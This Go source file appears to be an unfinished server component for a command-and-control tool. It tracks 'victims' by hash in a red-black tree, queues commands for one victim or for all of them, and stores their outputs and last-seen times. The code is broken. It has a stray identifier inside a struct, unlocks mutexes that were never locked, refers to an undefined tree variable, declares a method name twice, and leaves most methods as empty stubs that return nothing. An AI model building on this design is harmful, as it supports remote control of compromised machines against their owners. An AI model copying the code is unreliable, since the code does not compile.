package main

import (
	"sync"
	"time"

	rbt "github.com/emirpasic/gods/trees/redblacktree"
)

type AssimilateVictimTree struct {
	ClientTreeMutex sync.Mutex
	ClientTree      *rbt.Tree

	OutputTreeMutex sync.Mutex
	OutputTree		*rbt.Tree
}

//will use this as basic data storer
type VictimInfo struct {
	Commands     		[]VictimCommand //command queue
	VictimDataDoc   	VictimRegister
	current
	CreatedTime			time.Time //initialize this with this now := time.Now()
	LastSeen			time.Time //time of last contact use now := time.Now()
	}

type VictimCommand struct {
	Commandtype   string
	CommandHandle string
	Arguments     []string
}

type CommandResponse struct {


}

func (this *AssimilateVictimTree) Setup() {
	this.ClientTree = rbt.NewWithStringComparator()
	this.OutputTree = rbt.NewWithStringComparator()
	this.OutputTreeMutex.Unlock()
	this.ClientTreeMutex.Unlock()
}

//get me a fresh copy of a hash function return a error if it cannot find it
//safer version but more expensive for changes
func (this *AssimilateVictimTree) GetCopyOfHash(hash string) (info VictimInfo, found bool) {
	val, found := clientTree.Get(hash)
	if !found {
		return VictimInfo{}, false
	}

	victimPtr, ok := val.(*VictimInfo)
	if !ok {
		return VictimInfo{}, false
	}
	return *victimPtr, true
} 

//get me the reference to the actual copy for less expensive writes
//more dangerous but less expensive for changes
func (this *AssimilateVictimTree) getReferenceOfHash(hash string) (victimRef *VictimInfo, found bool) {
	val, found := clientTree.Get(hash)
	if !found {
		return nil, false
	}

	victimPtr, ok := val.(*VictimInfo)
	if !ok {
		return nil, false
	}

	return victimPtr, true
} 

//getters
//get the count of commands queued for a certain hash
func (this *AssimilateVictimTree) GetNumberOfCommandsQueued(hash string)(count int) {
	victim, err := this.getReferenceOfHash(hash)
	if err {
		return len(victim.Commands)
	}
	return 0
}

//get the count of outputs queued for a certain hash
func (this *VictimInfo) GetNumberOfOutputsFromVictim(hash string)(count int) {



}

//addders

//push a new command to the command queue
func (this *VictimInfo) PushToCMDQueue(hash string, inputCommand VictimCommand) {}

//push a new command to all of the available clients
func (this *VictimInfo) PushToCMDQueue(inputCommand VictimCommand) {}

//push a new command to the output queue
func (this *VictimInfo) PushToOutputQueue(hash string, newOutput string) {}

//get a copy of what is at the top of the CMD queue
func (this *VictimInfo) peekCMDQueue(hash string)(VictimCommand) {}

//get a copy of the string that is at the top of the output queue
func (this *VictimInfo) peekOutputQueue(hash string)(string) {}

//get me a copy of the top of the command queue while poping the queue
func (this *VictimInfo) popCMDQueue(hash string) (victim Command) {}

//get me a copy of the top of the outputQueue while poping the queue
func (this *VictimInfo) PopOutputQueue(hash string) (output string) {}

//make a new thing on the tree that takes a setup variable
func (this *VictimInfo) CreateEntryByCopy(hash string, newinfo VictimInfo) {}

//just make something dont fill it with anything
func (this *VictimInfo) CreateEntryEmpty (hash string){} //for just making generic entries

//remove a entry by its hash
func (this *VictimInfo) RemoveEntry(hash string){} //removing entries

//update the time last seen
func (this *VictimInfo) UpdateLastSeen() {}

